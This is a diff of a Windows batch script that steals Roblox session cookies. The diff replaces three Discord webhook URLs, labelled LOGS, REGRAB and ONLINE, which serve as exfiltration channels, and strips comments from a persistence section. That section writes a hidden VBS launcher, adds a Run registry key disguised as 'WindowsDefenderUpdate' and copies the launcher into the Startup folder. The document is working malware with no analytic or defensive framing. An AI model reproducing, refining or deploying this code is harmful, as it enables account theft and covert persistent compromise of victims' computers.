@@ -1,7 +1,7 @@
 @echo off
-set "LOGS=https://discord.com/api/webhooks/1563118305412386856/q_NFutmLx_3SYcRz5V6kpLs4NszFU0DXON4t484Kizg1JnhVdW60LGYntgxmt04n-uyA"
-set "REGRAB=https://discord.com/api/webhooks/1563118424929079298/E6jRzcYYY-UUycAzCamv5EqTNcBmWUjpmja39U_-BlHW8ExxU-ylIGpl4sIEWZiDl_M5"
-set "ONLINE=https://discord.com/api/webhooks/1563118517958746183/MkkFXgq5RRDWp-EL7h42SsAxYkpp00l63QdCCznJYfSEhj05m4qN4-Arjrc_TBXBvjYc"
+set "LOGS=https://discord.com/api/webhooks/1563118302715322368/9xgemSM8Sf-T3QMCNppQ10zpxz0CMjaGohxFCg6Hl8R0cVYB-ELK49meQbAfAtvS65Mt"
+set "REGRAB=https://discord.com/api/webhooks/1563321942797455460/9VXQBvrcfwAk15eHsIy3B4i7B2AmU3N90UdnIAUP_ZM9sgrakO1jfjgPcbu1SJwzH9S_"
+set "ONLINE=https://discord.com/api/webhooks/1563322005359689802/j8YrC7L0NiTS0Xr0EenAjLTUdEpn-GY0CMauHvjr877IA6JXsbd9kYpbUTGPkYMDJVda"
 
 set "PC=%COMPUTERNAME%"
 set "USER=%USERNAME%"
@@ -9,14 +9,10 @@ set "RC=%LOCALAPPDATA%\Roblox\LocalStorage\robloxcookies.dat"
 set "MY_PATH=%~dp0%~nx0"
 
 :: --- PERSISTENCE SETUP ---
-:: Create a VBS wrapper that hides the command prompt when it runs the batch file on startup
 echo Set WShell = CreateObject("WScript.Shell") > "%TEMP%\vanta_launch.vbs"
 echo WShell.Run """%~dp0%~nx0""", 0, False >> "%TEMP%\vanta_launch.vbs"
 
-:: 1. Drop into Registry Run
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsDefenderUpdate /t REG_SZ /d "wscript.exe //B \"%TEMP%\vanta_launch.vbs\"" /f >nul
-
-:: 2. Drop into Startup Folder
 copy /Y "%TEMP%\vanta_launch.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\wdu.vbs" >nul
 :: --------------------------
 
